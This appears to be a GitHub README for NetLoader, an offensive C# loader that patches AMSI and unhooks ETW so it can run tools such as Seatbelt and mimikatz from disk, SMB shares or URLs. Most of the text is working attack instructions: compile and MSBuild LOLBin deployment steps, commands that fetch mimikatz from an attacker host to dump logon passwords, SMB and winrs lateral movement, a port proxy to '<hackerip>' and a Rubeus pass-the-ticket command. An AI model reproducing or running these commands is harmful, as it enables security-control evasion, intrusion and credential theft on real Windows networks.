# NetLoader
Loads any C# binary from filepath or url, patching AMSI and unhooks ETW

** 01.10.2021 : Non-Obfuscated source code + SharpSploit to 'bypass' userland hooks when patching AMSI and ETW**

**Looking for binaries/payloads to deploy? Checkout [SharpCollection](https://github.com/Flangvik/SharpCollection)**!.  
SharpCollection contains nightly builds of C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines.
# Compile
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:RandomName.exe Program.cs
```
# Deploy via LOLBin (MSBuild)

Payload for MSBuild is in the /LOLBins folder, might push this for varius other LOLBins aswell.
Arguments have to be added into the bottom XML file when NetLoader is deployed using MSBuild
```

	Adding arguments to the XML payload
	    public class ClassExample : Task, ITask
	    {
	        public override bool Execute()
	        {	//Add your arguments here 
	            SoullikePrincelier.Main(new string[] { "--path", "\\smbshare\Seatbelt.exe" });
	            return true;
	        }
	    }
	For 64 bit:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml
	For 32 bit:
	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml
```
# Usage
Deploy payload from local path or SMB share (note that NetLoader automatically detects whether the path provided is local or remote)
`PS > .\NetLoader.exe --path Seatbelt.exe --args whoami
`PS > .\NetLoader.exe --path http://x.x.x.x/Tool/mimikatz.exe
	[!] ~Flangvik , ~Arno0x `NetLoader`
	[+] Successfully patched AMSI!
	[+] URL/PATH : Seatbelt.exe
	[+] Arguments : `whoami`

```
%&&@@@&&
&&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
&%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
&%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
&%%&&&%%%%%        v1.0.0         ,(((&%%%%%%%%%%%%%%%%%,
#%%%%##,

ERROR: Error running command "whoami"
[*] Completed collection in 0,008 seconds
```

Supports base64 inputs for those long strings that would usually break stuff! 
```
PS C:\Users\Clark Kent\Desktop> .\NetLoader.exe --b64 --path U2VhdGJlbHQuZXhl --args d2hvYW1p
	[!] ~Flangvik , ~Arno0x #NetLoader
	[+] All arguments are Base64 encoded, decoding them on the fly
	[+] Successfully patched AMSI!
	[+] URL/PATH : Seatbelt.exe
	[+] Arguments : whoami

%&&@@@&&
&&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
&%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
&%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*&%%&&&%%%%%        v1.0.0         ,(((&%%%%%%%%%%%%%%%%%,#%%%%##,

ERROR: Error running command "whoami"
[*] Completed collection in 0,006 seconds
```
# Todo
-   Automate the build and release of many of the Sharp Tools so they automagically appear in /Binaries SharpCollectionhttps://github.com/Flangvik/SharpCollection (CDI / Azure DevOps)
-   Add support for non-interactive use (input args)
-   Add support to run custom modules from your own URL or SMB Share (Great for on-the-fly Implant deployment)
-   Add an working MSBuild XML payload for the LOLBins lovers (Myself included)
-   Update with credits and links to the github repos that /Binaries SharpCollectionhttps://github.com/Flangvik/SharpCollection are compiled from


#### Copy file with SMB protocols

`PS > xcopy C:\NetLoder.exe \\ServerName\$C\Users\Publick /E /I
`PS > echo F | xcopy C:\Loder.exe \\ServerName\$C\Users\Publick\Loder.exe
`PS > winrs -r:servername C:\Users\Public\Loder.exe -Path http://x.x.x.x:8080/mimikatz.exe sekurlsa::logonpassword exit // detection by windows defender !!
Port Forwarding on windows
`PS > $null | winrs -r:servername "netsh interface portproxy add v4tov4  listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<hackerip>"

`PS > $null | winrs -r:servername C:\Users\Public\Loder.exe -Path http://127.0.0.1:8080/mimikatz.exe sekurlsa::logonpassword exit

Log on type 9
`ps > Rubeus.exe asktgt /user:administrator /aes256:aes256 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

`PS > winrs -r:hostname cmd`